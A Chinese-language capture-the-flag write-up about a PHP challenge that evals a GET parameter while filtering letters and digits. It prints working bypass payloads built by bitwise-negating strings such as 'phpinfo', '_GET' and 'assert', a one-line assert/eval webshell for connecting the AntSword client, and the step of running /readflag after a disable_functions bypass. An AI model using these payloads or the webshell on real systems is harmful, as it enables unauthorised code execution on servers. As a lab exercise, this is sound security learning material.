网页直接给出源码，如下：

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

一个RCE，/[A-Za-z0-9]+/过滤了字母和数字。对于无字母数字RCE，有三种方法：异或，自增，取反
最简单的是取反，构造phpinfo

```php
<?php
$cmd = ~'phpinfo';
echo urlencode($cmd);
if(preg_match("/[A-Za-z0-9]+/",$cmd)){
    echo "sorry";
}#一般取反后都不在数字字母范围了，这里检验一下以防万一
#获得取反结果%8F%97%8F%96%91%99%90
```

`?code=$_=(~(%8F%97%8F%96%91%99%90))();`

或者``?code=$_=~(%8F%97%8F%96%91%99%90);$_();``

随便放一起还是分开。
查看phpinfo信息发现是php7.0，用不了assert了，再查看一下禁用的方法
![image-20250809154322722](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250809154322722.png)

几个常见的命令执行函数都被禁用了，于是使用``执行系统命令

这里注意区分代码执行和命令执行，代码执行是eval这种执行php代码，命令执行是执行目标机器（linux）上的系统命令。

``有一个问题是不能回显，解决方案：

- 加一个打印函数
- php短标签，带echo功能
- 反弹一个shell

一个个尝试

**短标签**：目标：?code=?>\<?=\`$_GET[-]\`?>&-=ls

_GET取反后是%A0%B8%BA%AB

因此构造?code=?>\<?=\`${~(%A0%B8%BA%AB)}[%a0]\`?>&%a0=ls

但是发现都无法执行，命令执行函数全都被禁用，猜测反引号``也被禁用。

因此这是绕过disable_functions问题，而我们要先连接上蚁剑。题目本身环境有过滤的，考虑`assert($_POST[cmd])`这种。因为php7这样用不了，有一个变形：

`(assert)(eval($_POST[cmd]))`

php7.0中，assert仍可以当作函数调用
为什么要多一个eval($_POST[cmd])？为了绕过限制数字字母的环境，对你提交的第二个cmd参数没有检查

为什么要assert？因为我取反后要用函数调用方式，eval是构造器用不了。

```php
<?php
error_reporting(0);
$a = 'assert';
$b = '(eval($_POST[ant]))';
echo urlencode(~$a);
echo "<br>";
echo urlencode(~$b);
#%9E%8C%8C%9A%8D%8B
#%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%91%8B%A2%D6%D6
```

连接上蚁剑后发现只有/var可以访问，利用插件绕过disable_functions。

![image-20250809165558434](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250809165558434.png)

发现直接cat /flag无输出，于是输出到/var目录下，但是也无内容。

尝试执行/readflag >> /var/tmp/flag   成功获取flag